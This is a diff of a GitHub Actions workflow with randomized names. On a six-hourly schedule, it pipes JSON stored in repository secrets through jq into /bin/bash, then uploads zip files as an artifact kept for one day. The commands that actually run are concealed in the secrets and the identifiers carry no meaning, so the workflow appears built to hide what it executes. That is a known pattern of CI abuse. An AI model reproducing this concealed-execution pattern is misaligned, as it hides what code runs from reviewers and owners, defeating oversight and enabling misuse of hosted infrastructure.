@@ -1,9 +1,9 @@
 name: observerbit17
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '35 4/6 * * *'
+    - cron: '54 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: observerbit17
         env:
-          bkf56: ${{ secrets.bkf56 }}
+          te0029: ${{ secrets.te0029 }}
         run: |
-          echo $bkf56 | jq -r .yypx002 | /bin/bash
-          echo $jxbq4959 | jq -r .ptzz0 | /bin/bash
-          echo $vwwoq2799 | jq -r .pdthh8 | /bin/bash
-          echo $pfqpi8 | jq -r .sc2 | /bin/bash
-          echo $xm49737 | jq -r .yfnx5 | /bin/bash
-          echo $jgcw5 | jq -r .yo8406 | /bin/bash
-          echo $me84828 | jq -r .pfbbm31145 | /bin/bash
-          echo $xqav6 | jq -r .z9049 | /bin/bash
-          echo $feio22 | jq -r .tozso1454 | /bin/bash
-          echo $mzlq922 | jq -r .ayj44979 | /bin/bash
-          echo $l480 | jq -r .dynx6887 | /bin/bash
-          echo $juckl1 | jq -r .asjci07657 | /bin/bash
-          echo $kl2449 | jq -r .uwpt73945 | /bin/bash
+          printf '%s' "$te0029" | jq -r .f6 | /bin/bash
+          printf '%s' "$zq7848" | jq -r .fmk2 | /bin/bash
+          printf '%s' "$tas85539" | jq -r .yuuok865 | /bin/bash
+          echo $xy39327 | jq -r .ci721 | /bin/bash
+          printf '%s' "$pci940" | jq -r .b12542 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: axb8qBgv
+          path: "*.zip"
+          retention-days: 1
